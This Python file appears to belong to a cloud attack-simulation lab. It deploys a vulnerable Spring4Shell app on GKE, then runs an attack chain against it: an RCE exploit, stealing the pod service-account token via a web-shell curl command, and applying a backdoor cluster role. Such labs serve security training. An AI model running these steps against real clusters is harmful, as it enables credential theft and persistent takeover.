import os
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import loading_animation


PULUMI_STACK_NAME = "cobra-scenario-3"
PULUMI_OUTPUT_JSON_PATH = "./core/cobra-scenario-3-output.json"


class ScenarioExecution:
    def __init__(self):
        self.project_id = None
        self.cluster_name = None
        self.cluster_endpoint = None
        self.service_ip = None
        self.pod_sa_token = None

    # ------------------------------------------------------------------
    # Infrastructure helpers
    # ------------------------------------------------------------------
    def _remove_output_file(self):
        if os.path.exists(PULUMI_OUTPUT_JSON_PATH):
            os.remove(PULUMI_OUTPUT_JSON_PATH)
            print(f"File '{PULUMI_OUTPUT_JSON_PATH}' found and deleted.")
        else:
            print(f"File '{PULUMI_OUTPUT_JSON_PATH}' not found.")

    def _deploy_infra(self):
        subprocess.call(
            f"cd scenarios/scenario_3/infra/ && pulumi config set gcp:project {self.project_id}",
            shell=True,
        )
        self._remove_output_file()

        subprocess.call(
            f"cd ./scenarios/scenario_3/infra/ && pulumi up -s {PULUMI_STACK_NAME} -y",
            shell=True,
        )
        subprocess.call(
            f"cd ./scenarios/scenario_3/infra/ && pulumi stack -s {PULUMI_STACK_NAME} output --json >> ../../../{PULUMI_OUTPUT_JSON_PATH}",
            shell=True,
        )

    def _read_pulumi_output(self):
        with open(PULUMI_OUTPUT_JSON_PATH, "r") as file:
            data = json.load(file)

        self.cluster_name = data["cluster-name"]
        self.cluster_endpoint = data["cluster-endpoint"]

    def _authenticate_cluster(self):
        print(colored("Authenticate to the cluster", color="red"))
        loading_animation()
        subprocess.call(
            f"gcloud container clusters get-credentials {self.cluster_name} --region us-central1 --project {self.project_id}",
            shell=True,
        )

    def _deploy_web_app(self):
        print(colored("Deploying Web App and service", color="red"))
        loading_animation()
        subprocess.call(
            "kubectl apply -f ./scenarios/scenario_3/infra/app/service.yml",
            shell=True,
        )
        subprocess.call(
            "kubectl apply -f ./scenarios/scenario_3/infra/app/app.yml",
            shell=True,
        )

        sleep_duration = 60
        with tqdm(total=sleep_duration, desc="Loading") as pbar:
            while sleep_duration > 0:
                sleep_interval = min(1, sleep_duration)
                sleep(sleep_interval)
                pbar.update(sleep_interval)
                sleep_duration -= sleep_interval

        self.service_ip = (
            subprocess.check_output(
                "kubectl get svc spring4shell-web-service -o json | jq -r '.status.loadBalancer.ingress[0].ip'",
                shell=True,
            )
            .decode("utf-8")
            .strip()
            .rstrip("\n")
        )

    # ------------------------------------------------------------------
    # Attack steps
    # ------------------------------------------------------------------
    def _exploit_rce(self):
        print(
            colored(
                "Found RCE in the Web Server, exploiting and creating Shell",
                color="red",
            )
        )
        loading_animation()
        print("-" * 30)
        subprocess.call(
            f"sh scenarios/scenario_3/infra/app/exploit {self.service_ip}:8081",
            shell=True,
        )

    def _privilege_escalation(self):
        print(
            colored(
                "Found PrivEsc using Pod Default Service Account, escalating privs",
                color="red",
            )
        )
        loading_animation()
        print("-" * 30)
        subprocess.call(
            "kubectl apply -f scenarios/scenario_3/infra/app/sa-cr.yml",
            shell=True,
        )
        subprocess.call(
            "kubectl apply -f scenarios/scenario_3/infra/app/sa-cb.yml",
            shell=True,
        )

        self.pod_sa_token = (
            subprocess.check_output(
                f"curl --silent --output - 'http://{self.service_ip}:8081/shell.jsp?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token' | head -n 1",
                shell=True,
            )
            .decode("utf-8")
            .strip()
            .rstrip("\n")
        )
        self.pod_sa_token = self.pod_sa_token.replace("\x00", "")

    def _create_backdoor(self):
        print(colored("Creating a backdoor cluster role to persist", color="red"))
        loading_animation()
        print("-" * 30)
        subprocess.call(
            f"kubectl --server=https://{self.cluster_endpoint} --token={self.pod_sa_token} apply -f scenarios/scenario_3/infra/app/backdoor.yml",
            shell=True,
        )

    def _run_attack_simulation(self):
        """Run the full attack simulation."""
        self._exploit_rce()
        self._privilege_escalation()
        self._create_backdoor()

    # ------------------------------------------------------------------
    # Main entry points
    # ------------------------------------------------------------------
    def execute(self, manual):
        print("-" * 30)
        print(
            colored(
                "Executing Scenario 3 : Compromising a web app living inside a GKE Pod, access pod secret, escalate privilege, take over the cluster",
                color="red",
            )
        )

        self.project_id = input("Enter GCP Project ID: ")
        print(self.project_id)
        print(colored("Rolling out Infra", color="red"))
        loading_animation()
        print("-" * 30)

        self._deploy_infra()
        self._read_pulumi_output()
        self._authenticate_cluster()
        self._deploy_web_app()

        if manual:
            print(
                colored(
                    "Lab environment ready, use --post-launch for further attacks",
                    color="yellow",
                )
            )
            return

        self._run_attack_simulation()

    def post_execution(self):
        self._read_pulumi_output()

        # Need project_id for cluster auth — try to read from pulumi config
        if not self.project_id:
            self.project_id = (
                subprocess.check_output(
                    f"cd scenarios/scenario_3/infra/ && pulumi config get gcp:project -s {PULUMI_STACK_NAME}",
                    shell=True,
                )
                .decode("utf-8")
                .strip()
            )

        # Ensure cluster auth and service IP are available
        self._authenticate_cluster()
        self._deploy_web_app()

        print(colored("Select Post Simulation Task:", color="yellow"))
        print(colored("1. Exploit RCE in Web Server", color="green"))
        print(
            colored(
                "2. Privilege Escalation using Pod Service Account",
                color="green",
            )
        )
        print(colored("3. Create Backdoor Cluster Role", color="green"))
        print(
            colored(
                "4. Perform Full Attack (RCE, PrivEsc & Backdoor)",
                color="green",
            )
        )
        print(colored("5. Exit", color="green"))
        while True:
            try:
                choice = int(input(colored("Enter your choice: ", color="yellow")))
                if choice not in [1, 2, 3, 4, 5]:
                    raise ValueError(
                        colored(
                            "Invalid choice. Please enter 1, 2, 3, 4 or 5.",
                            color="red",
                        )
                    )
                if choice == 1:
                    self._exploit_rce()
                    return
                elif choice == 2:
                    self._exploit_rce()
                    self._privilege_escalation()
                    return
                elif choice == 3:
                    self._exploit_rce()
                    self._privilege_escalation()
                    self._create_backdoor()
                    return
                elif choice == 4:
                    self._run_attack_simulation()
                    return
                elif choice == 5:
                    return
            except ValueError as e:
                print(e)

    def destroy(self):
        print(colored("Destroying infrastructure...", "yellow"))
        subprocess.call(
            f"cd ./scenarios/scenario_3/infra && pulumi destroy -s {PULUMI_STACK_NAME} --yes",
            shell=True,
        )


# Backward compatibility — keep the old function name working
def scenario_3_execute():
    ScenarioExecution().execute(manual=False)
